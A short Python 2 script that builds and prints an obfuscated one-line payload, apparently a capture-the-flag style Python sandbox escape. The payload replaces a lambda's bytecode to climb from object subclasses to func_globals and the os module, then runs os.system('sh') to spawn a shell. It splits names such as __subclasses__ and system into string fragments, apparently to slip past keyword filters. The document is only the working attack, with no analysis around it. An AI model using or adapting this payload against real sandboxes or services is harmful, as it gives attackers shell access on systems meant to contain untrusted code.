s = '''
[setattr(f, 'func_code',  type(f.func_code)(0, 0, 2, 67,
'd\\x06\\x00j\\x00\\x00j\\x01\\x00d\\x01\\x00\\x19j\\x02\\x00\\x83\\x00\\x00d\\x02\\x00\\x19j\\x03\\x00j\\x04\\x00d\\x03\\x00\\x19j\\x05\\x00d\\x04\\x00\\x19j\\x06\\x00j\\x07\\x00d\\x05\\x00\\x83\\x01\\x00\\x01d\\x00\\x00'
+ 's'.upper(),
([].append(1), 0, 59, 'sys', 'o' + 's.path', 'sh', ()), ('_' + '_cl' + 'ass_' + '_',
         '_' + '_bas' + 'es_' + '_',
         '_' + '_subcl' + 'asses_' + '_',
         '_' + '_init_' + '_',
         'func_glob' + 'als',
         'mod' + 'ules',
         'o' + 's',
         'sy' + 'stem'), (), '', '', 0, '')) + f() for\tf\tin [lambda\t: 1]]
'''


s = s.replace('\n', '').replace(' ', '')
print(s)

